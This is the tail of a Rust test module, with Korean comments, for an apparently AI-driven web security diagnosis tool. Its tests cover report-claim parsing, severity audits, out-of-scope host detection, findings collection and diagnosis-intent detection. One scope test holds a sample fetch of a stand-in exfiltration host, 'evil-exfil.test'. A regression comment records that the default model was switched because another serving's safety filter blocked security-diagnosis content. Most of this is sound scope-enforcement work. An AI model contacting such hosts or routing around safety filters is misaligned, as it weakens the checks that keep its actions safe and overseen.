        assert_eq!(rep.checks.len(), 1, "{rep:?}");
        match &rep.checks[0].verdict {
            ClaimVerdict::Skipped(reason) => assert!(reason.contains("인가 밖"), "게이트 사유여야 한다: {reason}"),
            v => panic!("인가 밖 포트는 건너뛰어야 한다: {v:?}"),
        }
        assert_eq!(url_port(&format!("http://127.0.0.1:{port}/env")), Some(port));
        assert_eq!(url_port("https://h.local/x"), Some(443));
        assert_eq!(url_port("http://h.local/x"), Some(80));
        assert_eq!(url_port("notaurl"), None);
    }

    /// 루트 카드 파싱 — 헤딩 배지 우선, 배지 없으면 '위험도:' 줄 폴백.
    #[test]
    fn root_claim_extraction_shapes() {
        let text = "### 루트 1. SQL 인젝션으로 관리자 탈취 [높음]\n위험도: 높음\n검증: [실증] 재현 확인\n근거: [P-001] 과 [P-002]\n\n### 루트 2. 보안 헤더 누락\n위험도: 중간\n검증: [징후] 헤더 확인\n";
        let claims = extract_root_claims(text);
        assert_eq!(claims.len(), 2, "{claims:?}");
        assert_eq!(claims[0].title, "SQL 인젝션으로 관리자 탈취");
        assert_eq!(claims[0].severity, "높음");
        assert_eq!(claims[0].verification, "실증");
        assert_eq!(claims[0].p_ids, vec!["[P-001]".to_string(), "[P-002]".to_string()]);
        // 배지 없는 루트 — '위험도:' 줄에서 폴백.
        assert_eq!(claims[1].title, "보안 헤더 누락");
        assert_eq!(claims[1].severity, "중간");
        assert_eq!(claims[1].verification, "징후");
        assert!(claims[1].p_ids.is_empty());
        // 루트 헤딩이 없는 리포트는 빈 배열(extract_evidence_claims 와 동일 관대).
        assert!(extract_root_claims("# 리포트\n위험도: 높음\n검증: [실증]\n").is_empty());
    }

    /// 위험도 감사 — 과대(강등)/과소(은폐)/일치(무건)/근거없음.
    #[test]
    fn severity_audit_over_under_exact_no_evidence() {
        let text = "### 루트 1. 과대 [치명]\n위험도: 치명\n검증: [실증]\n근거 [P-001]\n\n### 루트 2. 과소 [높음]\n위험도: 높음\n검증: [실증]\n근거 [P-002]\n\n### 루트 3. 일치 [높음]\n위험도: 높음\n검증: [실증]\n근거 [P-003]\n\n### 루트 4. 근거없음 [중간]\n위험도: 중간\n검증: [가정]\n";
        let claims = extract_root_claims(text);
        let evidence: HashMap<String, String> = [
            ("[P-001]".to_string(), "medium".to_string()),
            ("[P-002]".to_string(), "critical".to_string()),
            ("[P-003]".to_string(), "high".to_string()),
        ]
        .into_iter()
        .collect();
        let audits = audit_claim_severities(&claims, &evidence);
        // 일치 건(루트 3)은 감사 건으로 남지 않는다.
        assert_eq!(audits.len(), 3, "{audits:?}");
        let over = audits.iter().find(|a| a.kind == "over").expect("과대 건");
        assert_eq!(over.claimed, "치명");
        assert_eq!(over.evidence_max.as_deref(), Some("medium"));
        let under = audits.iter().find(|a| a.kind == "under").expect("과소 건");
        assert_eq!(under.claimed, "높음");
        assert_eq!(under.evidence_max.as_deref(), Some("critical"));
        let ne = audits.iter().find(|a| a.kind == "no-evidence").expect("근거없음 건");
        assert!(ne.evidence_max.is_none());
    }

    /// 존재하지 않는 P-ID 인용은 무시 — 유효 ID 만으로 최대 심각도를 계산한다.
    #[test]
    fn severity_audit_ignores_unknown_p_ids() {
        let claims = extract_root_claims(
            "### 루트 1. 혼합 인용 [치명]\n위험도: 치명\n검증: [실증]\n근거 [P-001] [P-999]\n",
        );
        let evidence: HashMap<String, String> =
            [("[P-001]".to_string(), "medium".to_string())].into_iter().collect();
        let audits = audit_claim_severities(&claims, &evidence);
        assert_eq!(audits.len(), 1, "{audits:?}");
        assert_eq!(audits[0].kind, "over");
        assert_eq!(audits[0].evidence_max.as_deref(), Some("medium"));
    }

    /// 기계 대조 블록에 심각도 대조 소절이 실리고, 과대 건에 낮춤 지시가 붙는다.
    #[test]
    fn verify_block_reports_severity_over_audit() {
        let text = "### 루트 1. SQL 주입 [치명]\n위험도: 치명\n검증: [실증]\n근거 [P-001]\n";
        let evidence: HashMap<String, String> =
            [("[P-001]".to_string(), "medium".to_string())].into_iter().collect();
        let auth = auth::AuthList { allows: vec![], ..Default::default() };
        let rep = verify_report_claims(text, &evidence, &auth, "");
        assert_eq!(rep.severity.len(), 1, "{rep:?}");
        assert_eq!(rep.severity[0].kind, "over");
        let block = verify_report_block(&rep);
        assert!(block.contains("심각도 대조"), "{block}");
        assert!(block.contains("낮출 것"), "{block}");
        assert!(block.contains("중간"), "{block}");
        assert!(verify_note_line(&rep).contains("심각도 대조 1건"), "{}", verify_note_line(&rep));
    }

    #[test]
    fn out_of_scope_result_detection() {
        let auth = auth::AuthList {
            allows: vec!["demo.vulnlab.local".into()],
            ..Default::default()
        };
        // 인가 안 + 밖 혼합 → 밖만.
        let hits = out_of_scope_hosts_in_text(
            "200 OK https://demo.vulnlab.local/a fetched http://evil-exfil.test/collect",
            &auth,
        );
        assert_eq!(hits, vec!["evil-exfil.test".to_string()]);
        // 인가 안만 → 빈 목록.
        assert!(out_of_scope_hosts_in_text("https://demo.vulnlab.local/ok", &auth).is_empty());
        // 호스트 없음 → 빈 목록.
        assert!(out_of_scope_hosts_in_text("just some text 200", &auth).is_empty());
        // YAML scope → 해석 불가 빈 목록.
        let yaml = auth::AuthList { yaml: true, ..Default::default() };
        assert!(out_of_scope_hosts_in_text("http://evil-exfil.test/x", &yaml).is_empty());
        // ports 지시자: 인가 호스트의 인가 밖 포트도 경고 (host:port 표시).
        let pauth = auth::AuthList {
            allows: vec!["demo.vulnlab.local".into()],
            ports: Some(vec![443]),
            ..Default::default()
        };
        assert_eq!(
            out_of_scope_hosts_in_text("fetched https://demo.vulnlab.local:3306/dump", &pauth),
            vec!["demo.vulnlab.local:3306".to_string()]
        );
        assert!(out_of_scope_hosts_in_text("fetched https://demo.vulnlab.local/a", &pauth).is_empty());
    }

    #[test]
    fn findings_handoff_shapes() {
        // 파일명 살균.
        assert_eq!(findings_filename("w1"), "findings-w1.json");
        assert_eq!(findings_filename("rc-abc/w2"), "findings-rc-abcw2.json");
        // 저장 블록 — 경로 있을 때만.
        assert!(findings_save_block("", false).is_empty());
        let b = findings_save_block("/tmp/x/findings-w1.json", false);
        assert!(b.contains("/tmp/x/findings-w1.json") && b.contains("severity"), "{b}");
        let r = findings_save_block("/tmp/x/f.json", true);
        assert!(r.contains("덮어쓰기로 갱신"), "{r}");
        // 워커 지시문에 경로 반영.
        let def = &DEEP_WORKERS[0];
        let inst = deep_worker_instruction(def, "http://t/", "", "", "", "/tmp/x/findings-w1.json");
        assert!(inst.contains("/tmp/x/findings-w1.json") && inst.contains("## 워커 발견"));
        let inst0 = deep_worker_instruction(def, "http://t/", "", "", "", "");
        assert!(!inst0.contains("구조화 저장"), "빈 경로면 블록 생략");
    }

    #[test]
    fn collect_findings_block_shapes() {
        let base = std::env::temp_dir().join(format!("rc-find-{}", std::process::id()));
        let prime_id = base.join("psess");
        let sess = base.join("sess");
        // prime: w1 파일만 존재.
        let w1 = prime_id.join("w1").join("work");
        std::fs::create_dir_all(&w1).unwrap();
        std::fs::write(w1.join("findings-w1.json"), r#"[{"severity":"높음","title":"X"}]"#).unwrap();
        let b = collect_findings_block_in_dirs(&prime_id, &sess, Engine::Prime, "q");
        assert!(b.contains("구조화 발견") && b.contains("높음"), "{b}");
        // pi: piq 접두 파일만 수집.
        std::fs::create_dir_all(&sess).unwrap();
        std::fs::write(sess.join("findings-q-w2.json"), r#"[{"severity":"중간"}]"#).unwrap();
        std::fs::write(sess.join("findings-other-w3.json"), r#"[{"severity":"치명"}]"#).unwrap();
        let b2 = collect_findings_block_in_dirs(&prime_id, &sess, Engine::Pi, "q");
        assert!(b2.contains("중간") && !b2.contains("치명"), "{b2}");
        // 파일 없으면 빈 문자열 (텍스트 폴백).
        let b3 = collect_findings_block_in_dirs(&base.join("없음"), &base.join("없음2"), Engine::Prime, "q");
        assert!(b3.is_empty());
        std::fs::remove_dir_all(&base).ok();
    }

    #[test]
    fn temp_window_and_taskkill_shapes() {
        let dir = std::env::temp_dir().join(format!("rc-tmpw-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("loot.txt"), "x").unwrap();
        std::fs::write(dir.join("redcell-prompt-1"), "x").unwrap();
        let past = std::time::SystemTime::now() - std::time::Duration::from_secs(3600);
        let hits = temp_window_files_in(&dir, past);
        assert_eq!(hits, vec!["loot.txt".to_string()], "자사 패턴 제외: {hits:?}");
        let future = std::time::SystemTime::now() + std::time::Duration::from_secs(3600);
        assert!(temp_window_files_in(&dir, future).is_empty(), "미래 기준 빈 목록");
        assert!(temp_window_files_in(&dir.join("없음"), past).is_empty());
        assert_eq!(taskkill_tree_args(1234), vec!["/PID".to_string(), "1234".to_string(), "/T".to_string(), "/F".to_string()]);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn prime_spawn_stagger_shapes() {
        let _g = ENV_LOCK.lock().unwrap();
        assert_eq!(worker_spawn_index("w1"), 0);
        assert_eq!(worker_spawn_index("w5"), 4);
        assert_eq!(worker_spawn_index("merge"), 0);
        let saved = std::env::var_os("REDCELL_PRIME_SPAWN_STAGGER_MS");
        std::env::remove_var("REDCELL_PRIME_SPAWN_STAGGER_MS");
        assert_eq!(prime_spawn_stagger_ms(), 1500);
        std::env::set_var("REDCELL_PRIME_SPAWN_STAGGER_MS", "0");
        assert_eq!(prime_spawn_stagger_ms(), 0);
        std::env::set_var("REDCELL_PRIME_SPAWN_STAGGER_MS", "abc");
        assert_eq!(prime_spawn_stagger_ms(), 1500, "파싱 실패 기본값");
        match saved {
            Some(v) => std::env::set_var("REDCELL_PRIME_SPAWN_STAGGER_MS", v),
            None => std::env::remove_var("REDCELL_PRIME_SPAWN_STAGGER_MS"),
        }
    }

    #[test]
    fn prime_adapt_deep_adds_recon_discipline() {
        let deep = prime_adapt_deep("web_fetch 로 확인".into());
        assert!(deep.contains("python_repl+urllib"), "기본 치환 유지");
        assert!(deep.contains("python_repl") && deep.contains("## 심층 정찰 규율"), "정찰 규율 포함");
        assert!(deep.contains("한 python_repl 블록에 모아라"));
        let chat = prime_adapt("web_fetch 로 확인".into());
        assert!(!chat.contains("심층 정찰 규율"), "자유 채팅에는 규율 미부착");
    }

    #[test]
    fn prime_tooling_v2_directives() {
        for needle in [
            "python_repl",           // 유일 툴 선언
            "bash(",                 // 병렬 패턴
            "curl -sS -m 10",        // curl 규율
            "handle.kill()",         // 타임아웃 규율
            "edit.run",              // 결과물 파일 규칙
            "websearch.run",         // 금지 명시
            "rlm.spawn",             // 금지 명시
            "리터럴로 쓴다",         // 게이트 감사 가능성
        ] {
            assert!(PRIME_TOOLING.contains(needle), "지침 누락: {needle}");
        }
    }

    /// 회귀: lge-aigw 기본 모델은 보안 진단 콘텐츠를 통과시키는 서빙이어야 한다.
    /// Sonnet 5.5 서빙(esdp-sonnet-5-5)은 상류 안전 필터가 진단 용어·recon 툴 정의를
    /// 걸러 `completed` 빈 응답만 돌려준다(2026-10-26 실측) — 기본값으로 쓰면
    /// 분야·병합이 전부 빈 성공이 되어 리포트가 발행되지 않는다.
    #[test]
    fn lge_aigw_default_model_is_diagnosis_capable() {
        assert_eq!(LGE_AIGW_DEFAULT_MODEL, "system.ai.glm-5-3-flash");
        let cat = PROVIDER_CATALOG.iter().find(|p| p.name == "lge-aigw").expect("lge-aigw 카탈로그");
        assert_eq!(cat.default_model, LGE_AIGW_DEFAULT_MODEL);
    }

    /// 빈 성공 판정 — 정상 종료 + 텍스트 없음일 때만 true (실패·중지는 별도 경로).
    #[test]
    fn empty_success_only_when_clean_and_textless() {
        let clean_empty = PumpOutcome { text: String::new(), ..Default::default() };
        assert!(is_empty_success(&clean_empty));
        let clean_ws = PumpOutcome { text: "  \n ".into(), ..Default::default() };
        assert!(is_empty_success(&clean_ws));
        let clean_text = PumpOutcome { text: "pong".into(), ..Default::default() };
        assert!(!is_empty_success(&clean_text));
        let failed_empty = PumpOutcome { failed: true, ..Default::default() };
        assert!(!is_empty_success(&failed_empty));
        let aborted_empty = PumpOutcome { aborted: true, ..Default::default() };
        assert!(!is_empty_success(&aborted_empty));
    }

    /// .so 탐색 — 실행파일 옆 산출물을 찾는다 (build.rs 가 생성).
    #[test]
    fn netfilter_so_found_next_to_exe() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = std::env::var_os("REDCELL_NETFILTER_SO");
        std::env::remove_var("REDCELL_NETFILTER_SO");
        let found = netfilter_so_path();
        match saved {
            Some(v) => std::env::set_var("REDCELL_NETFILTER_SO", v),
            None => std::env::remove_var("REDCELL_NETFILTER_SO"),
        }
        assert!(found.map(|p| p.is_file()).unwrap_or(false), "build.rs 산출물 미발견");
    }

    /// 진단 의도 판별 — 한국어/영어 진단 지시는 진단으로 본다.
    #[test]
    fn diagnosis_intent_detected_ko_and_en() {
        assert!(looks_like_diagnosis("이 사이트 보안 진단해줘"));
        assert!(looks_like_diagnosis("우리 쇼핑몰 취약점 점검해줘"));
        assert!(looks_like_diagnosis("로그인 기능 모의해킹 해줘"));
        assert!(looks_like_diagnosis("please run a security assessment on this site"));
        assert!(looks_like_diagnosis("do a vulnerability scan of the login page"));
        assert!(looks_like_diagnosis("취약점 목록 뽑아줘"), "강한 신호는 일반 작업 표현과 함께 있어도 진단");
    }

    /// 일반 작업 지시는 진단이 아니다 — "파일로 뽑아줘" 류가 오탐되면 안 된다.
    #[test]
    fn general_task_is_not_diagnosis() {
        assert!(!looks_like_diagnosis("파일로 뽑아줘"));
        assert!(!looks_like_diagnosis("목록 정리해줘"));
        assert!(!looks_like_diagnosis("다운로드"));
        assert!(!looks_like_diagnosis("요약해줘"));
        assert!(!looks_like_diagnosis("사용할 수 있는 API 목록 찾아서 보여줘"));
        assert!(!looks_like_diagnosis("보안 문서 요약해줘"), "약한 신호 + 일반 작업 지시는 진단 아님");
        assert!(!looks_like_diagnosis("please review this code"));
    }

    /// 부정형은 진단이 아니다 — "진단 하지 마"·"don't pentest" 류.
    #[test]
    fn negated_diagnosis_is_not_diagnosis() {
        assert!(!looks_like_diagnosis("진단 하지 마"));
        assert!(!looks_like_diagnosis("diagnose 하지 마"));
        assert!(!looks_like_diagnosis("don't pentest"));
        assert!(!looks_like_diagnosis("보안 점검 하지 마세요"));
        assert!(!looks_like_diagnosis(""));
        assert!(!looks_like_diagnosis("   "));
    }

    /// 심층 의도 — 깊이 신호가 있으면 true, 일반 작업 지시면 승격하지 않는다.
    #[test]
    fn deep_intent_needs_depth_signal() {
        assert!(looks_like_deep_diagnosis("이 사이트를 깊게 진단해줘"));
        assert!(looks_like_deep_diagnosis("정밀하게 점검해줘"));
        assert!(looks_like_deep_diagnosis("전면적으로 취약점 봐줘"));
        assert!(looks_like_deep_diagnosis("thorough vulnerability review"));
        assert!(looks_like_deep_diagnosis("이 사이트를 깊게 살펴봐줘"));
        assert!(!looks_like_deep_diagnosis("파일 목록 정리해줘"));
        assert!(!looks_like_deep_diagnosis("이 사이트를 점검해줘"), "깊이 신호 없음");
        assert!(!looks_like_deep_diagnosis("이 페이지를 깊게 정리해줘"), "일반 작업 지시");
        assert!(!looks_like_deep_diagnosis(""), "빈 문자열");
    }

    /// 영문 키워드는 단어 경계를 지킨다 — 다른 단어의 일부로는 매칭하지 않는다.
    #[test]
    fn ascii_keywords_respect_word_boundary() {
        assert!(!has_kw("useful", &["use"]));
        assert!(has_kw("a cve-2024-1234 issue", &["cve"]));
        assert!(!has_kw("cves are filed", &["cve"]));
    }

}
